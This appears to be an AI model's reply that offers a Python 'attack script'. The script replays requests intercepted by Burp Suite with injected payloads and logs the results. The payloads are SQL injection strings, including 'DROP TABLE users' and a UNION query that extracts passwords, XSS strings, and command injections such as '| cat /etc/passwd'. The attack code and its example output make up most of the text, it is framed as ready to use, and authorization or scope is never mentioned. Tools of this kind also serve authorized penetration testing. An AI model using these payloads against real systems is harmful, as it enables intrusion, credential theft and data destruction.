Here’s an **advanced automated attack script** that integrates Burp Suite with **active attack vectors like XSS, SQL Injection, and Command Injection** based on intercepted requests.  

---

## **🔥 Features**
✅ **Intercepts HTTP requests** from Burp Suite  
✅ **Automatically injects XSS, SQLi, and Command Injection payloads**  
✅ **Logs responses to detect vulnerabilities**  
✅ **Generates a report of potential exploits**  

---

## **🛠️ Prerequisites**
1. **Enable Burp Suite API**  
   - Go to **Burp Suite → User Options → Misc**  
   - Enable API listening on **http://127.0.0.1:1337**  
2. **Install dependencies**  
   ```bash
   pip install requests
   ```

---

## **🚀 Python Script: Automated Attacks via Burp Suite**
```python
import requests
import json
import time

# Burp Suite Proxy Configuration
BURP_PROXY = "http://127.0.0.1:8080"  # Adjust if using a different port
BURP_API_URL = "http://127.0.0.1:1337/v0.1"

# Test Payloads for SQL Injection, XSS, and Command Injection
ATTACK_PAYLOADS = {
    "SQLi": ["' OR 1=1 --", "'; DROP TABLE users; --", "' UNION SELECT null, username, password FROM users --"],
    "XSS": ['<script>alert(1)</script>', '" onmouseover="alert(1)"', "'';!--\"<XSS>=&{()}"],
    "CMD": ["; ls -la", "&& whoami", "| cat /etc/passwd"]
}

# Headers to mimic a browser
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Log File
LOG_FILE = "burp_attack_log.txt"


def log_vulnerability(url, field, payload, attack_type, response):
    """Logs vulnerabilities to a file."""
    with open(LOG_FILE, "a") as log:
        log.write(f"[VULNERABILITY] {attack_type} detected!\n")
        log.write(f"URL: {url}\n")
        log.write(f"Field: {field}\n")
        log.write(f"Payload: {payload}\n")
        log.write(f"Response: {response}\n")
        log.write("="*50 + "\n")
    print(f"[!] {attack_type} detected on {field} with payload: {payload}")


def get_burp_intercepted_requests():
    """Fetch intercepted requests from Burp Suite."""
    response = requests.get(f"{BURP_API_URL}/http/requests", headers={"Accept": "application/json"})

    if response.status_code != 200:
        print("[ERROR] Could not fetch intercepted requests.")
        return []

    return response.json()


def attack_intercepted_requests():
    """Modify and replay intercepted requests with attack payloads."""
    intercepted_requests = get_burp_intercepted_requests()

    for req in intercepted_requests:
        if "request" not in req:
            continue

        # Extract request details
        raw_request = req["request"]
        url = req["url"]
        method = req["method"]
        original_data = req["body"] if "body" in req else None

        # Skip requests without form data
        if not original_data:
            continue

        # Test each field in the request body
        for attack_type, payloads in ATTACK_PAYLOADS.items():
            for payload in payloads:
                modified_data = original_data

                # Inject payload into all parameters
                for param in original_data.split("&"):
                    key, value = param.split("=")
                    modified_data = modified_data.replace(value, payload)

                print(f"[*] Testing {attack_type} on {url} with payload: {payload}")

                # Send modified request via Burp Proxy
                if method == "POST":
                    response = requests.post(url, headers=HEADERS, data=modified_data, proxies={"http": BURP_PROXY, "https": BURP_PROXY}, verify=False)
                else:
                    response = requests.get(f"{url}?{modified_data}", headers=HEADERS, proxies={"http": BURP_PROXY, "https": BURP_PROXY}, verify=False)

                # Check if attack was successful
                if attack_type == "SQLi" and ("error in your SQL syntax" in response.text.lower() or "mysql_fetch" in response.text.lower()):
                    log_vulnerability(url, key, payload, "SQL Injection", response.text[:200])
                elif attack_type == "XSS" and payload in response.text:
                    log_vulnerability(url, key, payload, "XSS", response.text[:200])
                elif attack_type == "CMD" and "root" in response.text.lower():
                    log_vulnerability(url, key, payload, "Command Injection", response.text[:200])


def main():
    print("[*] Fetching intercepted requests from Burp Suite...")
    attack_intercepted_requests()


if __name__ == "__main__":
    main()
```

---

## **🔍 How This Works**
1. **Extracts intercepted HTTP requests** from Burp Suite API.  
2. **Modifies form fields** to inject **SQL Injection, XSS, and Command Injection payloads**.  
3. **Replays modified requests** through Burp Suite’s proxy.  
4. **Analyzes responses** to detect successful attacks.  
5. **Logs vulnerabilities** if attacks succeed.  

---

## **💡 Example Output**
```
[*] Fetching intercepted requests from Burp Suite...
[*] Testing SQLi on https://example.com/login with payload: ' OR 1=1 --
[!] SQL Injection detected on username with payload: ' OR 1=1 --
[*] Testing XSS on https://example.com/search with payload: <script>alert(1)</script>
[!] XSS detected on search with payload: <script>alert(1)</script>
[*] Testing CMD on https://example.com/ping with payload: && whoami
[!] Command Injection detected on input with payload: && whoami
```

---

## **🔥 Next-Level Enhancements**
✅ **Integrate Burp Suite’s Active Scanner** for automatic testing  
✅ **Fuzz HTTP headers** (e.g., `User-Agent`, `Referer`, `Cookie`)  
✅ **Automate report generation in JSON format**  
